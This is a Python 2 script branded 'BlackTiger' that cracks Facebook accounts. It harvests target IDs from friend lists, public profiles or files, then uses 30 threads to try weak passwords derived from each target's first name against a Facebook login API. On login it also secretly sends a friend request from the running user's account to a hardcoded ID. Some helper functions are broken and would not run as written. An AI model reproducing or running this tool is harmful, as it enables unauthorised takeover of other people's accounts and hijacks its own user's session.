#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;93m██▀▀▀▀███▀▀▀▀███▀▀▀▀██
\033[1;91m█┌─┐┌─┐█┌─┐┌─┐█┌─┐┌─┐█
\033[1;91m█└─┘└─┘█└─┘└─┘█└─┘└─┘█
\033[1;91m██▌└┘▐███▌└┘▐███▌└┘▐██
\033[1;93m██┼┼┼┼███┼┼┼┼███┼┼┼┼██
\033[1;93m██▄▄▄▄███▄▄▄▄███▄▄▄▄██

\033[1;91m================🐅BLACK_TIGER🐅=============
\033[1;93m╭┳✪✪╤──────────────────────────✪✪➛➢
\033[1;92m•🎭▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🎭
\033[1;94m[💈♚♚💈]Name:\033[1;92mBlack_Tiger🎯       
\033[1;95m[💈♚♚💈]☏\033[1;93m → +923037335114🎃   
\033[1;94m[💈♚♚💈]YouTub Channal→Time4 You🔱         
\033[1;95m[💈♚♚💈]Github:\033[1;97m BlackTiger-Error404🀄
\033[1;94m[💈♚♚💈]From:\033[1;91m   Pakistan🏰         
\033[1;92m•🎭▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅🎭
\033[1;93m╰┻✪✪╧──────────────────────────✪✪➛➢
\033[1;93m▅▅▅┈┈┈╱▔▔▔▔▔▔▔▔╲┈┈┈
\033[1;93m▅▅▅┈┈┈▏┈┈┈┈┈┈┈┈▕┈┈┈
\033[1;91m▅▅▅┈┈┈    ╭━╮┈┈╭━╮▕┈┈┈
\033[1;91m▅▅▅╱▔╲╲╰━╯╱╲╰━╯╱╱▔╲
\033[1;91m▅▅▅╲▂╲╲▏╮┈▔▔┈╭▕  ╲╲▂╱
\033[1;93m▅▅▅╱▔╲╲    ┣╋╋╋╋┫  ╲╲      ╲
\033[1;93m▅▅▅╲▂╱┈╲▂▂▂▂▂▂╱┈╲▂╱
\033[1;91m================🐅BLACK_TIGER🐅============="""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;92mBlackTiger████████▒▒▒▒▒..100% \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""
jalan("\033[1;91m💈▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;91m💈▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;97m🐅⌠BlackTiger Start Loading.......⌡🎭➲ 20%") 
jalan("\033[1;92m💈▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;92m💈▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;97m🐅⌠BlackTiger Start Loading.......⌡🎭➲ 40%") 
jalan("\033[1;93m💈▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;93m💈▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;97m🐅⌠BlackTiger Start Loading.......⌡🎭➲ 60%")
jalan("\033[1;94m💈▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▓▓") 
jalan("\033[1;94m💈▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓") 
jalan("\033[1;97m🐅⌠BlackTiger Start Loading.......⌡🎭➲ 80%") 
jalan("\033[1;95m💈▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓") 
jalan("\033[1;95m💈▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓") 
jalan("\033[1;97m🐅⌠BlackTiger Start Loading.......⌡🎭➲ 100%") 
jalan("\033[1;96m💈▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▓▓") 
jalan("\033[1;96m💈▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▓▓") 
print  """\033[1;92m⊱✪✪⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯⋯✪✪⊰"""


CorrectUsername = "PingPong"
CorrectPassword = "Zbr10"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;95m[🔐] \x1b[1;93mUsername Of Tool \x1b[1;95m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;95m[🔐] \x1b[1;93mPassword Of Tool \x1b[1;95m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully BlackTiger " + username #BlackTiger
	
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://www.youtube.com/channel/UCqAyAEOedaDlFVsZFravPpw')
    else:
        print "Wrong Username"
        os.system('xdg-open https://www.youtube.com/channel/UCqAyAEOedaDlFVsZFravPpw')
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[🎯] \x1b[1;95mLOGIN WITH FACEBOOK \x1b[1;96m[🔰]' )
		id = raw_input('\033[1;96m[🔐] \x1b[1;95mID/Email \x1b[1;91m: \x1b[1;92m')
		pwd = raw_input('\033[1;96m[🔐] \x1b[1;95mPassword \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;94m[🌐] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[💈] \x1b[1;92mLogin Successful BlackTiger'
				os.system('xdg-open https://www.youtube.com/channel/UCqAyAEOedaDlFVsZFravPpw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;94m[🌐] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;93m[⚠] \x1b[1;91mYour account⚠checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;93m[⚠] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;93m[🎯] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;93m[⚠] \033[1;91mYour account⚠checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;94m[🌐] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print  """\033[1;93m╭┳✪✪╤───────────────────✪✪➛➢"""                
	print "\033[1;91m[\033[1;95m💈\033[1;96m]\033[1;92m Name \033[1;91m: \033[1;97m"+nama+"\033[1;97m               "
	print "\033[1;92m[\033[1;96m💈\033[1;96m]\033[1;92m ID   \033[1;91m: \033[1;97m"+id+"\x1b[1;97m              "
	print  """\033[1;93m╰┻✪✪╧───────────────────✪✪➛➢"""                
	print 42*"\033[1;96m="
	print  """\033[1;92m╭┳✪✪╤───────────────────✪✪➛➢"""                
	print "\x1b[1;93m[\x1b[1;93m💈[1]\x1b[1;96m]\x1b[1;95m Start Hacking"
	print "\x1b[1;94m[\x1b[1;93m💈[0]\x1b[1;96m]\x1b[1;91m Exit            "
	print  """\033[1;92m╰┻✪✪╧───────────────────✪✪➛➢"""                
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;92m >>> \033[1;92m")
	if unikers =="":
		print "\033[1;96m[💈] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[💈] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;93m[⚠] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	print  """\033[1;92m╭┳✪✪╤───────────────────✪✪➛➢"""                
	print "\x1b[1;96m[\x1b[1;94m💈1\x1b[1;96m]\x1b[1;92m 👪Crack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m💈2\x1b[1;96m]\x1b[1;94m 🌐Crack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;93m💈3\x1b[1;96m]\x1b[1;93m 🎫Crack From File"
	print "\x1b[1;96m[\x1b[1;91m🔱0\x1b[1;96m]\x1b[1;91m 🔙Back"
	print  """\033[1;92m╰┻✪✪╧───────────────────✪✪➛➢"""                
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;93m[⚠] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[💈] \033[1;95mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;93m[💈] \033[1;92mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;93m🔱\033[1;96m] \033[1;92mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;93m[⚠] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;93mBack\033[1;96m]")
			super()
		jalan('\033[1;94m[💈] \033[1;95mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;93m[🎫] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;93m[⚠] \x1b[1;91mFile Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;95mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[⚠] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;94m[💈] \033[1;95mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;93m[🔱] \033[1;95mStarting BlackTiger█████▒▒▒..99%  \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m💈\033[1;96m] \033[1;97mCracking BlackTiger█████▒▒▒▒..99%  \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;93m[⚠] \x1b[1;95mTo Stop Process Press CTRL Then Press z')
	print 42*"\033[1;96m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;96mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
					print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""   
				else:
					pass2 = ('000786')
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;96m[\x1b[1;95mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
							print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
						else:
							pass3 = b['first_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;96m[\x1b[1;94mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
									print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
								else:
									pass4 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;96m[\x1b[1;96mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
											print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;96m[\x1b[1;91mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
													print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
												else:
													pass6 = ('Pakistan')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;96m[\x1b[1;92mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
															print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + ('1122') + ('786')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;96m[\x1b[1;97mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	print  """\033[1;92m╰┻✪✪╧──────────────────────────────➛➢"""
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;96m="
	print '\033[1;91m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;92m[💈] \033[1;92mTotal OK/\x1b[1;95mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;93m[💈] \033[1;97mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
